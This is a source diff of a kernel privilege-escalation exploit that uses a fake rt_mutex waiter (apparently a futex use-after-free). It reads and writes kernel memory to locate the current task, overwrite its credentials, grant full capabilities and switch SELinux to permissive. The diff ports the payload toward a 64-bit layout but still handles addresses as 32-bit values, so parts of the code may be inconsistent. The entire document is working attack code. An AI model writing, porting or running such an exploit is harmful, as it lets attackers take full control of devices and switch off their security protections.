@@ -134,7 +134,7 @@ static void stamp_stack(void) {
     unsigned covered = 0;
     for (int k = 0; k < (int)sizeof(buf); k++) {
         int j = k + delta;
-        if (j >= 0 && j < 0x24) {
+        if (j >= 0 && j < 0x44) { // Cover the full 64-bit waiter (0x44 bytes)
             buf[k] = payload[j];
             covered++;
         }
@@ -849,79 +849,20 @@ static int kernel_grant_full_caps(int fd, uint32_t cred) {
 static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);
 static int kernel_ptr(uint32_t p);
 
-#define SELINUX_STATUS_PAGE 0xc100c3e8u
-#define GL_MEM_MAP 0xc1001ac4u
-#define GL_PFN_OFFSET 0xc0f0bb44u
 #define GL_VA_SUB 0x81000000u
 #define GL_STATUS_BIAS 0x1000000u
 #define GL_STATUS_SCAN_PAGES 8192
 
-static int gl_status_page_va(int fd, uint32_t *out) {
-    uint32_t page = 0, mem_map = 0, pfnoff = 0;
-    if (!kernel_read_u32(fd, SELINUX_STATUS_PAGE, &page) || !kernel_ptr(page) ||
-        !kernel_read_u32(fd, GL_MEM_MAP, &mem_map) || !kernel_ptr(mem_map) ||
-        !kernel_read_u32(fd, GL_PFN_OFFSET, &pfnoff))
-        return 0;
-    *out = ((pfnoff + ((page - mem_map) >> 5)) << 12) - GL_VA_SUB;
-    return 1;
-}
 
 static int kernel_set_permissive(int fd, uint32_t task) {
     (void)task;
     uint32_t before = 1, after = 1;
     kernel_read_u32(fd, g_profile.selinux_enforcing, &before);
 
-    uint32_t uver = 0, uenf = 1, upol = 0, udeny = 0;
-    int sfd = open("/sys/fs/selinux/status", O_RDONLY | O_CLOEXEC);
-    if (sfd >= 0) {
-        long pgsz = sysconf(_SC_PAGESIZE);
-        volatile uint32_t *ust = mmap(NULL, (size_t)pgsz, PROT_READ, MAP_SHARED, sfd, 0);
-        if (ust != MAP_FAILED) {
-            uver = ust[0];
-            uenf = ust[2];
-            upol = ust[3];
-            udeny = ust[4];
-            munmap((void *)ust, (size_t)pgsz);
-        }
-        close(sfd);
-    }
-
-    uint32_t base = 0, kva = 0;
-    int ok = 0;
-    if (uver == 1 && gl_status_page_va(fd, &base) && kernel_ptr(base)) {
-        uint32_t bpage = (base + GL_STATUS_BIAS) & ~0xfffu;
-        for (int d = 0; d <= GL_STATUS_SCAN_PAGES && !ok; d++) {
-            uint32_t cand[2];
-            int nc = 0;
-            cand[nc++] = bpage + (uint32_t)d * 0x1000u;
-            if (d)
-                cand[nc++] = bpage - (uint32_t)d * 0x1000u;
-            for (int i = 0; i < nc && !ok; i++) {
-                uint32_t c = cand[i], a0 = 0, a2 = 0, a3 = 0, a4 = 0, a5 = 0;
-                if (kernel_ptr(c) && kernel_read_u32(fd, c, &a0) && a0 == 1 &&
-                    kernel_read_u32(fd, c + 8, &a2) && a2 == uenf && kernel_read_u32(fd, c + 12, &a3) &&
-                    a3 == upol && kernel_read_u32(fd, c + 16, &a4) && a4 == udeny &&
-                    kernel_read_u32(fd, c + 20, &a5) && a5 == 0) {
-                    kva = c;
-                    ok = 1;
-                }
-            }
-        }
-    }
-    dprintf(2, "[perm] status base=%08x kva=%08x ok=%d uver=%u uenf=%u upol=%u udeny=%u\n", base, kva,
-            ok, uver, uenf, upol, udeny);
-
-    if (ok) {
-        uint32_t seq = 0;
-        kernel_read_u32(fd, kva + 4, &seq);
-        uint32_t zero32 = 0;
-        kernel_write_data(fd, g_profile.selinux_enforcing, &zero32, sizeof(zero32));
-    }
-
-    uint8_t zero_int[2] = {0};
-    kernel_write_once(fd, g_profile.selinux_enforcing + 1, zero_int, sizeof(zero_int));
+    uint32_t zero32 = 0;
+    kernel_write_data(fd, g_profile.selinux_enforcing, &zero32, sizeof(zero32));
     kernel_read_u32(fd, g_profile.selinux_enforcing, &after);
-    dprintf(2, "[perm] enforcing %u->%u; status %s\n", before, after, ok ? "updated" : "not-updated");
+    dprintf(2, "[perm] enforcing %u->%u\n", before, after);
     fsync(2);
     return after == 0;
 }
@@ -969,10 +910,10 @@ static uint32_t find_current_task(int fd) {
     for (unsigned count = 0; count < 4096; count++) {
         if (link == INIT_TASK_TASKS)
             break;
-        if (link < 0xc1000000u || link >= 0xf0000000u || (link & 3u))
+        if (!kernel_ptr(link))
             return 0;
         uint32_t task = link - TASK_TASKS_OFF;
-        if (task < 0xc1000000u || task >= 0xf0000000u)
+        if (!kernel_ptr(task))
             return 0;
         char comm[17] = {0};
         if (kernel_read_once(fd, task + TASK_COMM_OFF, comm, 16) != 16)
@@ -1022,15 +963,30 @@ static int patch_current_credentials(int fd, uint32_t task) {
 
 static void make_reclaimed_write_payload(uint32_t target) {
     memset(payload, 0, sizeof(payload));
-    put_a32(0x00, g_fake_fops);
-    put_a32(0x04, 0);
-    put_a32(0x08, target);
-    put_a32(0x0c, g_fake_fops);
-    put_a32(0x10, 0);
-    put_a32(0x14, target);
-    put_a32(0x18, PI_TASK);
-    put_a32(0x1c, g_fake_lock);
-    put_a32(0x20, 0x7fffffffu);
+    /* 64-bit rt_mutex_waiter layout:
+     *   0x00: tree_entry (rb_node, 24 bytes)
+     *   0x18: pi_tree_entry (rb_node, 24 bytes)
+     *   0x30: task  (8 bytes)
+     *   0x38: lock  (8 bytes)
+     *   0x40: prio  (4 bytes)
+     */
+    put_a32(0x00, g_fake_fops);            /* tree_entry.rb_parent_color lo */
+    put_a32(0x04, 0);                      /*                              hi */
+    put_a32(0x08, target);                 /* tree_entry.rb_right lo       */
+    put_a32(0x0c, 0);                      /*                       hi     */
+    put_a32(0x10, g_fake_fops);            /* tree_entry.rb_left lo        */
+    put_a32(0x14, 0);                      /*                      hi      */
+    put_a32(0x18, PI_TASK);                /* pi_tree_entry.rb_parent_color lo */
+    put_a32(0x1c, 0);                      /*                                hi */
+    put_a32(0x20, g_fake_lock);            /* pi_tree_entry.rb_right lo    */
+    put_a32(0x24, 0);                      /*                        hi    */
+    put_a32(0x28, target);                 /* pi_tree_entry.rb_left lo     */
+    put_a32(0x2c, 0);                      /*                       hi     */
+    put_a32(0x30, PI_TASK);                /* waiter->task lo              */
+    put_a32(0x34, 0);                      /*             hi               */
+    put_a32(0x38, g_fake_lock);            /* waiter->lock lo              */
+    put_a32(0x3c, 0);                      /*             hi               */
+    put_a32(0x40, 0x7fffffffu);            /* waiter->prio                 */
 }
 
 static int validate_loaded_profile(char *error, size_t error_size) {
@@ -1055,7 +1011,7 @@ static int validate_loaded_profile(char *error, size_t error_size) {
         TASK_TASKS_OFF, TASK_REAL_CRED_OFF, TASK_CRED_OFF, TASK_COMM_OFF,
     };
     for (unsigned i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
-        if (offsets[i] >= 0x2000u || (offsets[i] & 3u)) {
+        if (offsets[i] >= 0x2000u || (offsets[i] & 7u)) {
             snprintf(error, error_size, "profile contains invalid structure offset %08x",
                      offsets[i]);
             return 0;
@@ -1068,13 +1024,13 @@ static int validate_loaded_profile(char *error, size_t error_size) {
         snprintf(error, error_size, "profile contains invalid CPU or timing parameters");
         return 0;
     }
-    if (TASK_REAL_CRED_OFF + 4 != TASK_CRED_OFF || TASK_CRED_OFF + 4 != TASK_COMM_OFF ||
+    if (TASK_REAL_CRED_OFF + 8 != TASK_CRED_OFF || TASK_CRED_OFF + 8 != TASK_COMM_OFF ||
         !g_profile.kernel_size ||
         g_profile.kernel_similarity_ppm > 1000000u) {
         snprintf(error, error_size, "profile contains inconsistent layout metadata");
         return 0;
     }
-    if (g_profile.futex_hash_len < 2 || g_profile.futex_hash_len > 3 ||
+    if (g_profile.futex_hash_len < 2 || g_profile.futex_hash_len > 4 ||
         (g_profile.futex_hash_buckets & (g_profile.futex_hash_buckets - 1)) ||
         !g_profile.futex_hash_buckets || g_profile.futex_hash_buckets > KS_HASH_MAX) {
         snprintf(error, error_size, "profile contains invalid futex hash parameters");
